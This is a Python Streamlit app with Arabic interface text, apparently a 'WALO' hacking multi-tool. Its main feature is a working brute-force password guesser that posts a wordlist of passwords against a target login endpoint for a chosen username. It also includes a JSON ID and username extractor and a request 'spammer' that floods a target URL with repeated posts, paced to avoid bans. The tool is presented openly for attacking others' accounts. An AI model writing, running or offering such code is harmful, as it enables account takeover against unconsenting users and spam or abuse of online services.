import streamlit as st
import requests
import time

# إعدادات الصفحة الفخمة لحساب WALO
st.set_page_config(page_title="WALO Multi-Tool & Automator", page_icon="⚡", layout="centered")

st.title("⚡ سكربت WALO الذكي للتحكم والأتمتة")
st.write("أداة مخصصة للتخمين، فحص الحسابات، وإرسال الطلبات التلقائية بلمحة بصر")
st.markdown("---")

# القائمة الجانبية لاختيار الأداة
option = st.sidebar.selectbox("اختر الأداة اللي تبي تشغلها:", ["أداة التخمين (Brute Force)", "مستخرج المعرفات (ID Extractor)", "أتمتة الحسابات (Automation)"])

if option == "أداة التخمين (Brute Force)":
    st.subheader("🕵️‍♂️ نظام التخمين وفحص الحسابات")
    target_api = st.text_input("أدخل رابط تسجيل الدخول (API Endpoint):", "https://example.com/api/login")
    user_input = st.text_input("اسم المستخدم المستهدف (Username):")
    pass_list = st.text_area("أدخل قائمة كلمات المرور (كلمة في كل سطر):", "123456\npassword\nadmin123")
    
    if st.button("ابدأ التخمين والخرش 🚀", use_container_width=True):
        if not user_input or not target_api:
            st.warning("يا واد حط الرابط واسم المستخدم أول شي!")
        else:
            passwords = pass_list.split("\n")
            st.info(f"جاري فحص قائمة الكلمات ضد الحساب: {user_input}...")
            
            progress_bar = st.progress(0)
            for index, password in enumerate(passwords):
                password = password.strip()
                if not password:
                    continue
                
                # إرسال طلب التخمين (تقدر تعدل البيانات حسب الموقع المستهدف)
                payload = {"username": user_input, "password": password}
                try:
                    response = requests.post(target_api, data=payload, timeout=5)
                    
                    # هنا نفحص استجابة السيرفر لو نجح الدخول
                    if response.status_code == 200 and "success" in response.text.lower():
                        st.success(f"🎉 قفطنا الباسورد الصح: {password}")
                        break
                    else:
                        st.text(f"❌ تجربة فاشلة للباسورد: {password}")
                except Exception as e:
                    st.error(f"خطأ في الاتصال: {e}")
                
                # تحديث شريط التقدم
                progress_bar.progress((index + 1) / len(passwords))
            else:
                st.warning("انتهت القائمة ومحد لقط الباسورد الصح، جرب لستة ثانية.")

elif option == "مستخرج المعرفات (ID Extractor)":
    st.subheader("📊 مستخرج بيانات الحسابات والمعرفات")
    json_data = st.text_area("الِصق استجابة الـ JSON هنا لاستخراج الـ IDs واليوزرات:")
    
    if st.button("استخراج البيانات فورا 🔎", use_container_width=True):
        if not json_data:
            st.warning("حط كود الـ JSON عشان نقفطه لك!")
        else:
            # سكربت سريع لتنظيف واستخراج المعرفات
            import re
            ids = re.findall(r'"id":\s*"?(\d+)"?', json_data)
            usernames = re.findall(r'"username":\s*"([^"]+)"', json_data)
            
            if ids or usernames:
                st.success(f"لقطنا {len(ids)} معرف و {len(usernames)} اسم مستخدم!")
                st.write("🆔 **المعرفات المستخرجة:**", ids)
                st.write("👤 **اليوزرات المستخرجة:**", usernames)
            else:
                st.error("ما لقينا أي بيانات مطابقة في النص اللي حطيته.")

elif option == "أتمتة الحسابات (Automation)":
    st.subheader("🤖 سكربت الإرسال التلقائي (Spammer / Automator)")
    target_spam = st.text_input("رابط إرسال الطلبات / الرسائل:")
    spam_msg = st.text_input("النص أو البيانات المراد إرسالها بكثرة:")
    count = st.number_input("عدد مرات الإرسال الدبل:", min_value=1, max_value=100, value=10)
    
    if st.button("اضرب وافرز الطلبات 💣", use_container_width=True):
        if not target_spam:
            st.warning("وين الرابط يا بعدي؟ حطه أول!")
        else:
            st.info("جاري بدء الأتمتة وضخ الطلبات الحين...")
            for i in range(int(count)):
                try:
                    res = requests.post(target_spam, data={"data": spam_msg}, timeout=5)
                    st.text(f"📥 طلب رقم {i+1} تم إرساله بنجاح. كود الحالة: {res.status_code}")
                    time.sleep(0.5) # وقت مستقطع عشان ما ينصك السكربت باند
                except:
                    st.error(f"فشل إرسال الطلب رقم {i+1}")
            st.success("قفلنا الأتمتة والطلبات كلها راحت سلام سلام!")

